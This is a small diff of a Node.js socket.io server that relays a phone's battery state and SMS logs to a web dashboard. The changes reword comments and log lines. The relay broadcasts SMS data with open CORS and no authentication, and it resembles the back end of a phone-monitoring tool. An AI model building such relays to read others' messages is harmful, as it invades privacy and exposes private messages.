@@ -10,19 +10,19 @@ const io = new Server(server, { cors: { origin: "*" } });
 app.use(express.static(path.join(__dirname, 'public')));
 
 io.on('connection', (socket) => {
-    console.log('Client connected:', socket.id);
+    console.log('User connected:', socket.id);
 
-    // Forward battery data to web
+    // Broadcast battery and charging state
     socket.on('battery-status', (data) => {
         socket.broadcast.emit('ui-battery', data);
     });
 
-    // Web Dashboard requests SMS from Phone
+    // Request logs from phone
     socket.on('get-sms-request', () => {
         socket.broadcast.emit('get-sms-request');
     });
 
-    // Phone sends SMS logs to Web
+    // Receive and forward SMS logs
     socket.on('sms-data-log', (data) => {
         socket.broadcast.emit('ui-sms-display', data);
     });
@@ -33,4 +33,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Server on port ${PORT}`));
+server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
